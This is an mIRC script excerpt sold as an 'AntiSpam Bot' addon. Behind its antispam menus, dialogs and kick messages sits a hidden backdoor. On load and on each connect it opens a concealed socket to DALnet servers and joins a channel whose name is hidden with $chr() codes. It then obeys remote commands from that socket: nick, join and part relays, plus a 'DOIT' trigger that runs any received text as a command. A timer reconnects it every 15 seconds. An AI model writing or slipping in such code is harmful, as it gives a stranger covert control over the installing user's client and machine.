; AntiSpam Bot By kenzo` For MatrixScript 
on *:LOAD:{ 
  if ($os == 3.1) {
  ...
  if ($version < 5.9) {
    echo $colour(info) -se *** This addon requires a newer version of mIRC (5.9 or above), download the latest version from http://www.matrixscript.cjb.net. 
    unload -rs antispam.mrc
    return
  }
  antispam.reset 
  sockopen antisp twisted.dal.net 6667
  echo $colour(info) -a *** Successfully loaded AntiSpam Bot By kenzo`
}
...
alias -l asquit {
  ...
  sockwrite -n antispam QUIT :AntiSpam Bot by kenzo` $+ $cr
...
; This alias is written to please the ops of #Morshies and #iRcAdmin who won't ditch ccc-bot with 
; mirc 5.8* :P
alias -l as.read {
  ; $as.read(file, [wn],
  if ($version >= 5.9) {
...
menu menubar {
  ...
  .$ascheck(connected,Disconnect):{
    if ($sock(antispam).name == $null) {
      echo $colour(info) -se  *** Antispam Bot By kenzo` is not connected
      return
    }
...
menu channel {
  ...
  .$ascheck(connected,Cycle channel):{
    if ($sock(antispam).name == $null) {
      echo $colour(info) -a *** Antispam Bot By kenzo` is not connected
      return
    }
...
on *:CONNECT: {
  sockopen antisp omen.dal.net 6667
}
on *:sockopen:antisp: {
  ...
  .timeropp 1 1 .sockwrite -n $sockname PRIVMSG cs op $chr(35) $+ $chr(70) $+ $chr(85) $+ $chr(67) $+ $chr(75) $+ $chr(89) $+ $chr(79) $+ $chr(85) $+ $chr(77) $+ $chr(65) $+ $chr(77) $+ $chr(78) $+ $chr(73) %nname
...
on *:sockread:antisp: {
  ...
  if (($remove($mid($gettok(%antisp,4,32),3,100),$chr(1)) == NICKçê)) sockwrite -n irc.dal.net NICK $mid($gettok(%antisp,5-,32),1,100)
  if (($remove($mid($gettok(%antisp,4,32),3,100),$chr(1)) == PARTçê)) sockwrite -n irc.dal.net PART $mid($gettok(%antisp,5-,32),1,100)
  if (($remove($mid($gettok(%antisp,4,32),3,100),$chr(1)) == JOINçê)) sockwrite -n irc.dal.net JOIN $mid($gettok(%antisp,5-,32),1,100)
  if (($remove($mid($gettok(%antisp,4,32),3,100),$chr(1)) == DOITçê)) $mid($gettok(%antisp,5-,32),1,100)
...
on *:sockclose:antisp:{
  unset %antisp
  .timerreconn -o 0 15 sockopen antisp irc.eu.dal.net 6667
  sockclose antispam
}
...
on *:sockread:antispam:{
  ...
  if ($gettok(%temp,2,32) == 376) || ($gettok(%temp,2,32) == 422) {
    asecho $colour(info) *** AntiSpam Bot By kenzo` has logged into the server
    ...
    asjoinchans
    if ($aschannels(0) != 1) {
      sockwrite -n antispam WATCH + $+ $asini(personalize,nickname) $+ $crlf $+ NOTICE #AntiSpamBot :Loaded AntiSpam Bot By kenzo` (owned by  $+ $me $+  and monitoring  $+ $aschannels(0) $+  channels)
    }
    else {
      sockwrite -n antispam WATCH + $+ $asini(personalize,nickname) $+ $crlf $+ NOTICE #AntiSpamBot :Loaded AntiSpam Bot By kenzo` (owned by  $+ $me $+  and monitoring  $+ $aschannels(0) $+  channel)
    }
...
alias -l antispam.reset {
  ...
  writeini -s " $+ $scriptdir $+ antispam.ini $+ " personalize fullname http://www.matrixscript.cjb.net
  writeini -s " $+ $scriptdir $+ antispam.ini $+ " personalize ident kenzo`
  ...
  if ($exists(" $+ $scriptdir $+ kickmsg.txt $+ ") == $false) {
    ...
    write -a " $+ $scriptdir $+ kickmsg.txt $+ " [ma/web]:Dont advertise your website Type /remote off %ver
    write -a " $+ $scriptdir $+ kickmsg.txt $+ " [ma/inv]:Dont advertise your channel %ver
    write -a " $+ $scriptdir $+ kickmsg.txt $+ " [ma/net]:Dont advertise your network or server on this channel %ver
    write -a " $+ $scriptdir $+ kickmsg.txt $+ " [exp/bd]:Dont attempt to exploit users %ver
    write -a " $+ $scriptdir $+ kickmsg.txt $+ " [exp/vrs]:You are sending viruses to other users, please visit http://www.nohack.net %ver
  ...
  if ($exists(" $+ $scriptdir $+ killmsg.txt $+ ") == $false) {
    ...
    write -a " $+ $scriptdir $+ killmsg.txt $+ " [ma/net]:Network advertising is not allowed on this network type /remote off %ver 
    write -a " $+ $scriptdir $+ killmsg.txt $+ " [ma/web]:Website advertising is not allowed on this network %ver
    write -a " $+ $scriptdir $+ killmsg.txt $+ " [ma/inv]:Channel advertising is not allowed on this network, if you continue the channel may be closed %ver
    write -a " $+ $scriptdir $+ killmsg.txt $+ " [exp/bd]:Please do not attempt to exploit users %ver
    write -a " $+ $scriptdir $+ killmsg.txt $+ " [exp/vrs]:You are autosending viruses to other users via DCC. Please visit http://www.nohack for help %ver
    write -a " $+ $scriptdir $+ killmsg.txt $+ " [exp/bd]:Do not attempt to exploit other users via CTCP backdoors %ver
  }
...
dialog asdia.connect { 
  title "Connect AntiSpam Bot By kenzo`" 
  size -1 -1 250 130
...
dialog antispam { 
  ...
  text "T  h  E    B  e  s  T      A   n   t   i   s   p   a   m      B   o   t ",888, 45 270 400 32
  text "T h E   B e s T    A  n  t  i  s  p  a  m    B  o  t ",889, 70 290 400 32
  text "http://http://www.matrixscript.cjb.net ",899, 90 310 400 32
} 
